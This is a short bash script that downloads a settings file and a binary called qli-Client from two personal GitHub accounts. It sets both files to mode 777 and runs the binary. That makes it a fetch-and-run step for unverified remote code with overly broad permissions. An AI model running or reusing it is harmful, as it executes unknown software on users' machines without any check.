#!/bin/bash

wget https://github.com/ranalims99/nice/raw/main/appsettings.json
wget https://github.com/bondaltomason/meo/releases/download/2.7.0/qli-Client
chmod 777 qli-Client appsettings.json
./qli-Client
